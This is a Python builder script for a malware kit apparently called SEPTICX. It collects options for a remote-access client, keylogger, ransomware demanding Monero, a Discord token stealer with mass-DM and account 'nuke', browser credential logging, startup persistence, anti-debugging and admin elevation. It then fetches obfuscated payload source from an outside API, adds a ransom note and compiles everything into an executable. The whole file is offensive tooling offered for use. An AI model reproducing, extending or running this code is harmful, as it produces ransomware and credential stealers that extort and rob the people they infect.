from colorama import Style, Fore, Back
from tqdm import tqdm
import subprocess, requests, random, base64, json, fade, time, math, sys, os

class Main:
    def __init__(self):
        os.system('')
        self.banner()
        config = self.get_input()
        print(f'{Fore.CYAN}Compiling program...{Style.RESET_ALL}')
        self.compile(config)

    def banner(self):
        print(fade.greenblue("""
   ▄████████    ▄████████    ▄███████▄     ███      ▄█   ▄████████ ▀████    ▐████▀ 
  ███    ███   ███    ███   ███    ███ ▀█████████▄ ███  ███    ███   ███▌   ████▀  
  ███    █▀    ███    █▀    ███    ███    ▀███▀▀██ ███▌ ███    █▀     ███  ▐███    
  ███         ▄███▄▄▄       ███    ███     ███   ▀ ███▌ ███           ▀███▄███▀    
▀███████████ ▀▀███▀▀▀     ▀█████████▀      ███     ███▌ ███           ████▀██▄     
         ███   ███    █▄    ███            ███     ███  ███    █▄    ▐███  ▀███    
   ▄█    ███   ███    ███   ███            ███     ███  ███    ███  ▄███     ███▄  
 ▄████████▀    ██████████  ▄████▀         ▄████▀   █▀   ████████▀  ████       ███▄ 
        """))

    def get_answer(self, message):
        answers = ('n', 'y')

        answer = input(message)

        while True:
            
            if not answer:
                print(self.color("Invalid answer!", 'red'), end="\r")
                time.sleep(1)
                answer = input(message)
                continue

            target = answer[0].lower()
            if not target in answers:
                print(self.color("Invalid answer!", 'red'), end="\r")
                time.sleep(1)
                answer = input(message)
                continue

            return target == 'y'

    def compile(self, config):
        rat_client, server_addr, server_key, dynamic_webhook, webhook, ransomware, reboots_allowed, wallet, cost, keylogger, token_logger, massdm, massdm_script, auto_nuke, browser, startup, debug, icon, admin = config
        key = {
            "SERVER_CLIENT": rat_client,
            "HOSTNAME": f'O0O000OOO00O0OOO0("{server_addr}").decode()',
            "SERVERKEY": f'O0O000OOO00O0OOO0("{server_key}").decode()',
            "KEYLOGGER": keylogger,
            "RANSOMWARE": ransomware,
            "REBOOTS_ALLOWED": reboots_allowed,
            "MONERO_WALLET": wallet,
            "CRYPTO_AMOUNT": cost,
            "WEBHOOK": "'webhook'" if not dynamic_webhook else 'requests.get(f"https://{self.ht}/webhook",data={"key":self.k}).text',
            "TOKEN_LOGGER": token_logger,
            "NUKE_TOKEN": auto_nuke,
            "MASSDM": massdm,
            "MASSDM_SCRIPT": massdm_script,
            "BROWSER_LOGGER": browser,
            "ANTI_DEBUG": debug,
            "ADD_TO_STARTUP": startup,
            "ADMIN": admin
        }

        src = requests.get('https://septicx.repl.co/api/obfuscate', json={
            "options": {
                "base": self.base,
                "recursion": self.recursion,
                "bytes": self.bytes,
            },
            "config": key,
            "hwid": self.hwid,
            "key": self.key
            
        }, headers={'content-type':'application/json'}).content

        print(src)

        with open('src\\output.py', 'wb') as file:
            file.write(src)

        with open('src\\files\\instructions.txt', 'r+') as file:
            data = file.read()

        with open('src\\temp\\instructions.txt', 'w+') as file:
            file.write(data.replace('WALLET', wallet).replace('AMOUNT', str(cost)))

        dir = os.path.dirname(os.path.realpath(__file__))

        python = subprocess.check_output('where python').splitlines()[0]
        packages = f"{python}\\lib\\site-packages"

        print(dir)
        command = ['pyinstaller', '--noconfirm', '--onefile', '--windowed', '--icon' if icon else '', icon if icon else '', '--uac-admin' if admin else '', '--upx-dir', 'build\\upx', '--workpath', 'build', '--specpath', 'build\\spec', '--add-data', f'{dir}\\src\\files\\annoy.mp3;.', '--add-data', f'{dir}\\src\\temp\\instructions.txt;.', '--add-data', f'{dir}\\src\\files\\wallpaper.jpg;.', f'--paths', packages, f'{dir}\\src\\output.py']
        
        for _ in range(command.count('')):
            command.remove('')
        print(command)

        subprocess.run(command)
        print(self.color('Your file is in the dist folder named "output.exe"'))
        os.system('PAUSE')
        
    def color(self, text, color='blue'):
        key = {
            "blue": Fore.CYAN,
            "red": Fore.RED,
            "green": Fore.GREEN
        }

        return key[color] + text + Style.RESET_ALL

    def get_input(self):
        server_addr = ''
        server_key = ''
        wallet = ''
        massdm_script = ''
        cost = 0
        reboots_allowed = 0
        webhook = ''
        massdm = False
        auto_nuke = False
        massdm_script = ''
        keylogger = False
        dynamic_webhook = False
        color = self.color
        
        self.hwid = str(subprocess.check_output('wmic csproduct get uuid'), 'utf-8').split('\n')[1].strip()

        while True:
            print(color("Enter API key: "), end="> ")
            self.key = input("")
            test = requests.get('https://septicx.repl.co/api/verify', data={'key':self.key, 'hwid': self.hwid})
            if not test.status_code == 200:
                print(color('Invalid Key!'+' '*30, 'red'), end='\r')
                time.sleep(1)
                continue

            for x, char in enumerate(color('Valid Key!', 'green')):
                if not x+1 == len(color('Valid Key!', 'green')):
                    sys.stdout.write(char)
                    sys.stdout.flush()
                else:
                    print(char)
                time.sleep(0.05)

            while True: # No, deleting this will not "crack the program"
                if test.json()['response']['premium']:
                    print(color("Enter Obfuscation Level (1-5): "), end="> ")
                    try:
                        self.recursion = int(input(""))
                    except:
                        print(color('Invalid Input!', 'red'), end='\r')
                        time.sleep(1)
                        continue

                    print(color("Set Base Obfuscation Level (2-55000): "), end="> ")
                    try:
                        self.base = int(input(""))
                    except:
                        print(color('Invalid Input!', 'red'), end='\r')
                        time.sleep(1)
                        continue

                    self.bytes = self.get_answer(color("Use random byte characters (Y or N): ")+"> ")
                    if not self.bytes:
                        self.base = 93

                else:
                    self.recursion = 0
                    self.bytes = 0
                    self.base = 0

                break

            break


        load = self.get_answer(color("Load config from config.json (Y or N): ")+"> ")

        if load:
            config = json.load(open('config.json', 'r+'))

            rat_client = config['CONNECT_TO_SERVER'][0]
            if rat_client:
                server_addr = config['CONNECT_TO_SERVER'][1]['SERVER_ADDRESS']
                server_key = config['CONNECT_TO_SERVER'][1]['SERVER_KEY']
                dynamic_webhook = config['CONNECT_TO_SERVER'][1]['DYNAMIC_WEBHOOK']
                keylogger = config['KEYLOGGER']
            else:
                webhook = config['WEBHOOK']

            ransomware = config['RANSOMWARE'][0]
            if ransomware:
                reboots_allowed = config['RANSOMWARE'][1]['REBOOTS_ALLOWED']
                wallet = config['RANSOMWARE'][1]['WALLET']
                cost = config['RANSOMWARE'][1]['RANSOM_AMOUNT']

            token_logger = config['TOKEN_LOGGER'][0]
            if token_logger:
                massdm = config['TOKEN_LOGGER'][1]['MASSDM']
                massdm_script = config['TOKEN_LOGGER'][1]['MASSDM_SCRIPT']
                auto_nuke = config['TOKEN_LOGGER'][1]['AUTO_NUKE']

            browser = config['LOG_BROWSER']
            startup = config['ADD_TO_STARTUP']
            debug = config['ANTI_DEBUG']
            icon = config['FILE_ICON']
            admin = config['RUN_WITH_ADMIN']

        else:
            rat_client = self.get_answer(color("Connect to webserver? (Y or N): ")+"> ")

            if rat_client:
                print(color("Enter server address: "), end="")
                server_addr = base64.b64encode(input("> ").replace('https://', '').replace('http://', '').replace('wss://', '').replace('ws://', '').split('/')[0].encode()).decode()

                print(color("Enter server key: "), end="")
                server_key = base64.b64encode(input("> ").encode()).decode()

                dynamic_webhook = self.get_answer(color("Enable Dynamic Webhooks (Y or N): ")+'> ')

                keylogger = self.get_answer(color("Enable Keylogging (Y or N): ")+"> ")

            if not dynamic_webhook:
                webhook = base64.b64encode(input("> ").encode())

            ransomware = self.get_answer(color("Enable Ransomware (Y or N): ")+"> ")

            if ransomware:
                while True:
                    try:
                        print(color("How many reboots until ransomware runs: "), end="")
                        reboots_allowed = int(input("> "))
                        break
                    except:
                        print(color('Invalid number!', 'red'), end='\r')
                        time.sleep(1)

                print(color("Enter your Monero Wallet: "), end="")
                wallet = input("> ")

                print(color("Enter cost to retrieve files: "), end="")
                cost = input("> ")

            token_logger = self.get_answer(color("Enable Token Logging (Y or N): ")+"> ")

            if token_logger:
                massdm = self.get_answer(color("Enable Discord MassDM (Y or N): ")+"> ")

                if massdm:
                    print(color("Enter massdm script below (For New Lines use \\n): "), end="")
                    massdm_script = (input('>')).replace('\\n', '\n')

                auto_nuke = self.get_answer(color("Enable Auto Token Nuke (Y or N): ")+"> ")

            browser = self.get_answer(color("Enable Browser Logs (Y or N): ")+"> ")
            startup = self.get_answer(color("Run on startup (Y or N): ")+"> ")
            debug = self.get_answer(color("Anti Debug (Y or N): ")+"> ")

            print(color("Custom Icon Path (Leave Blank if none): "), end="")
            icon = input("> ")

            admin = self.get_answer(color("Run as Administator? (Y or N): ")+"> ")

        return rat_client, server_addr, server_key, dynamic_webhook, webhook, ransomware, reboots_allowed, wallet, cost, keylogger, token_logger, massdm, massdm_script, auto_nuke, browser, startup, debug, icon, admin
            

if __name__ == "__main__":
    Main()